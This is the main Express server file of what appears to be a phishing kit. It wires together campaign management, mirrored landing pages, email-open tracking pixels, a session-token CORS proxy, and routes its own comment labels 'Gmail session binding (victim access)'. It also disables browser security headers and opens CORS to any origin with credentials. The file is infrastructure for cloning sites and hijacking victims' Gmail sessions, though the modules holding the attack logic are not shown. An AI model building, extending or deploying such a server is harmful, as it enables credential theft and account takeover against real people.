require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

// Configuration and database
const config = require('./config');
const db = require('./database');

// Services
const landingPageService = require('./services/landingPageService');
const websiteMirroringService = require('./services/websiteMirroringService');
const trackingService = require('./services/trackingService');

// Import main API routes
const campaignRoutes = require('./routes/campaignRoutes');
const authRoutes = require('./routes/authRoutes');
const templateRoutes = require('./routes/templateRoutes');
const landingPageRoutes = require('./routes/landingPageRoutes');
const profileRoutes = require('./routes/profileRoutes');
const userGroupRoutes = require('./routes/userGroupRoutes');
const userRoutes = require('./routes/userRoutes');
const utilityRoutes = require('./routes/utilityRoutes');
const aiScraperRoutes = require('./routes/aiScraperRoutes');
const { router: gmailBrowserRoutes, gmailBrowserController } = require('./routes/gmailBrowserRoutes');

// Import new organized routes
const { router: gmailSessionRoutes, initService: initGmailSessionService } = require('./routes/gmailSessionRoutes');
const { router: trackingRoutes, initServices: initTrackingServices } = require('./routes/trackingRoutes');
const { corsProxyHandler, mirroringMiddleware, initService: initMirroringService } = require('./middleware/mirroringMiddleware');

// Create Express app and server
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"]
  }
});

// Initialize services with dependencies
initGmailSessionService(gmailBrowserController.gmailBrowserService);
initTrackingServices(trackingService, io);
initMirroringService(websiteMirroringService);

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Security and CORS middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  originAgentCluster: false,
  strictTransportSecurity: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'],
  allowedHeaders: ['*'],
  credentials: true,
  maxAge: 86400
}));

// Request logging and parsing
app.use(morgan('combined'));
app.use(express.json({ limit: '300mb' }));
app.use(express.urlencoded({ extended: true }));

// Handle preflight requests
app.options('*', (req, res) => {
  res.status(200).json({});
});

// API Routes
app.use('/api', campaignRoutes);
app.use('/api', authRoutes);
app.use('/api', templateRoutes);
app.use('/api', landingPageRoutes);
app.use('/api', profileRoutes);
app.use('/api', userGroupRoutes);
app.use('/api', userRoutes);
app.use('/api', utilityRoutes);
app.use('/api', aiScraperRoutes);
app.use('/api/gmail-browser', gmailBrowserRoutes);

// Register landing page routes
landingPageService.registerLandingPageRoutes(app);

// Gmail session binding routes (victim access)
app.use('/', gmailSessionRoutes);

// Tracking routes
app.use('/', trackingRoutes);

// Latest campaign endpoint
app.get('/api/latest-campaign', async (req, res) => {
  try {
    const query = `SELECT * FROM campaigns WHERE status = 'In Progress' ORDER BY created_at DESC LIMIT 1`;
    const result = await db.get(query);

    if (result) {
      res.json(result);
    } else {
      res.status(404).json({ message: 'No campaign with status In Progress found.' });
    }
  } catch (error) {
    console.error('Error fetching latest campaign:', error);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// CORS proxy endpoint
app.all('/api/cors-proxy/:sessionToken', corsProxyHandler);

// Handle preflight CORS requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma, X-Proxy-Target, X-Original-Host');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(200).end();
});

// Database schema updates
db.run(`
  ALTER TABLE open_logs
  ADD COLUMN email_client TEXT DEFAULT 'Unknown'
`, (err) => {
  if (err && !err.message.includes('duplicate column')) {
    console.error('Error adding email_client column:', err);
  }
});

// Website mirroring middleware (must be after other routes)
app.use('/:sessionToken', mirroringMiddleware);

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('New client connected', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected', socket.id);
  });
});

// Pass Socket.IO instance to services
websiteMirroringService.setSocketIO(io);
gmailBrowserController.setSocketIO(io);

// Health check routes
app.get('/', (req, res) => {
  res.json({ 
    status: 'Backend is running',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

app.get('/api/gmail-browser/health', async (req, res) => {
  try {
    const health = await gmailBrowserController.gmailBrowserService.healthCheck();
    res.json(health);
  } catch (error) {
    res.status(500).json({
      status: 'error',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Catch-all for undefined routes
app.use((req, res) => {
  res.status(404).json({ message: 'Not Found' });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Server error:', err);

  if (process.env.NODE_ENV !== 'production') {
    return res.status(500).json({
      message: 'Internal Server Error',
      error: err.message,
      stack: err.stack
    });
  }

  res.status(500).json({ message: 'Internal Server Error' });
});

// Start the server
const PORT = config.port;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
  console.log(`Tracking URL: ${config.trackingUrl}/tracker/:id.png`);
});

// Handle server shutdown
process.on('SIGINT', async () => {
  console.log('Shutting down server...');
  process.exit(0);
});

module.exports = { app, server, io };
